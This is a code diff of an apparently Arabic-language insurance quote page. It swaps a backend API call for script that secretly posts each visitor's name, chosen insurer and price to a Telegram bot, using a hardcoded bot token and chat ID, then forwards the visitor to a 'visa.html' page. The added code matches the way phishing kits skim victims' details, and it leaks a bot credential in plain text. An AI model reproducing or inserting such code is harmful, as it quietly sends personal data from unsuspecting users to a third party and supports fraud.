@@ -555,43 +555,45 @@
   </div>
   
 <script>
-    // API Configuration
-    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
-      ? 'http://localhost:3000'
-      : '';
-
-    // Get session ID
-    function getSessionId() {
-      return localStorage.getItem('sessionId') || '';
-    }
+    // Telegram Configuration
+    const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const chatId = '7785288759';
 
     // Get owner name
     function getOwnerName() {
       return localStorage.getItem('owner_name') || 'غير معروف';
     }
 
-    // Submit company selection to backend server
-    async function submitToServer(data) {
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
-        const response = await fetch(`${API_BASE_URL}/api/submit/company`, {
+        const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ...data,
-            sessionId: getSessionId()
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
         return await response.json();
       } catch (error) {
-        console.error('Server error:', error);
-        return { success: false, error: error.message };
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
     }
 
-    // Store price and navigate to next page (no server submission)
-    function storePrice(button) {
+    // Submit company selection to Telegram
+    async function submitToServer(data) {
+      const message = `
+🏢 <b>تم اختيار شركة التأمين:</b>
+━━━━━━━━━━━━━━━
+👤 العميل: ${data.owner_name}
+🏢 الشركة: ${data.company_name}
+💰 السعر: ${data.price}
+      `;
+      return await sendToTelegram(message);
+    }
+
+    // Store price and send to Telegram
+    async function storePrice(button) {
       const card = button.closest('.insurance-card');
       const price = card.querySelector('.price').textContent.trim();
       const company = card.querySelector('.header h3')?.textContent.trim() || 'غير معروف';
@@ -602,7 +604,10 @@
       localStorage.setItem('selectedCompany', company);
       localStorage.setItem('selectedImage', image);
 
-      // Navigate to visa page (no server submission)
+      // Send to Telegram
+      await submitToServer({ owner_name: getOwnerName(), company_name: company, price: price });
+
+      // Navigate to visa page
       window.location.href = "visa.html";
     }
 
